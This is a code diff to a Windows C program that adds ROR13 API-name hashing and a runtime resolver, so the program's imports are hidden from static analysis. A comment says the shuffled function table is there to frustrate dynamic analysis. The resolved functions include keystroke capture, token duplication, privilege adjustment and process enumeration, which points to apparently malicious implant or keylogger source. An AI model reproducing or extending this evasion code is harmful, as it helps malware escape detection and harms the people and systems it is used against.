@@ -1,6 +1,51 @@
 #include <Windows.h>
 #include <TlHelp32.h>
 
+#ifdef NOAPI
+#include "ror13_hashes.h"
+#include "mglib.h"
+
+// These force DLLs to get loaded, we need the dll loaded to get its load address
+volatile PVOID dmp1 = &IsValidAcl;   // advapi32
+volatile PVOID dmp2 = &MessageBoxA;  // USER32
+
+UINT64 ApiResolverAPIs[] = {
+    HASH_ROR13_RegisterClassExA,
+    HASH_ROR13_CreateWindowExA,
+    HASH_ROR13_DispatchMessageA,
+    HASH_ROR13_TranslateMessage,
+    HASH_ROR13_GetMessageA,
+    HASH_ROR13_AdjustTokenPrivileges,
+    HASH_ROR13_GetModuleFileNameA,
+    HASH_ROR13_Process32Next,
+    HASH_ROR13_Process32First,
+    HASH_ROR13_SetThreadDesktop,
+    HASH_ROR13_CreateProcessWithTokenW,
+    HASH_ROR13_DuplicateTokenEx,
+    HASH_ROR13_OpenProcess,
+    HASH_ROR13_CreateToolhelp32Snapshot,
+    HASH_ROR13_GetKeyNameTextW,
+    HASH_ROR13_memcpy,
+    HASH_ROR13_CloseHandle,
+    HASH_ROR13_CreateFileMappingA,
+    HASH_ROR13_FreeLibrary,
+    HASH_ROR13_CreateFileMappingW,
+    HASH_ROR13_MapViewOfFile,
+    HASH_ROR13_GetKeyboardState,
+    HASH_ROR13_GetKeyState,
+    HASH_ROR13_RegisterClassExW,
+    HASH_ROR13_GetAsyncKeyState,
+    HASH_ROR13_OpenDesktopA,
+    HASH_ROR13_GetCurrentProcess,
+    HASH_ROR13_OpenProcessToken,
+    HASH_ROR13_GetUserNameA,
+    HASH_ROR13_VirtualProtect,
+    HASH_ROR13_VirtualAlloc,
+    HASH_ROR13_LoadLibraryA,
+    HASH_ROR13_GetProcAddress,
+    HASH_ROR13_LookupPrivilegeValueA
+};
+#else
 PVOID ApiResolverAPIs[] = {
     &RegisterClassExA,
     &CreateWindowExA,
@@ -37,7 +82,7 @@ PVOID ApiResolverAPIs[] = {
     &GetProcAddress,
     &LookupPrivilegeValueA
 };
-
+#endif
 // This include MUST be below the ApiResolverAPIs array
 // If its not, the #defines will mess up
 #include "apiresolver.h"
@@ -51,6 +96,25 @@ void InitApiResolver(void)
 {
     ApiResolverSeed = time(NULL);
     srand(ApiResolverSeed);
+
+    #ifdef NOAPI
+    PVOID dlls[] = {NoAPIGetBaseAddress(HASH_ROR13_ntdll_dll),
+                    NoAPIGetBaseAddress(HASH_ROR13_USER32_dll),
+                    NoAPIGetBaseAddress(HASH_ROR13_ADVAPI32_dll),
+                    NoAPIGetBaseAddress(HASH_ROR13_KERNEL32_DLL),
+                    NULL};
+
+    for (int i = 0; i < ApiEnumCount; i++) {
+        for (int j = 0; dlls[j] != NULL; j++) {
+            UINT64 tmp = (UINT64)NoAPIGetProcAddress(dlls[j], ApiResolverAPIs[i]);
+            if (tmp != 0) {
+                ApiResolverAPIs[i] = tmp;
+                dprintf("ApiResolversAPIs[%d]: %p \n", i, ApiResolverAPIs[i]);
+                break;
+            }
+        }
+    }
+    #endif
 
     // This delta is very important. It randomizes the array order in memory to frustrate dynamic analysis.
     // For example, LoadLibraryA can be found at apiresolverstruct[0] depending on this delta.
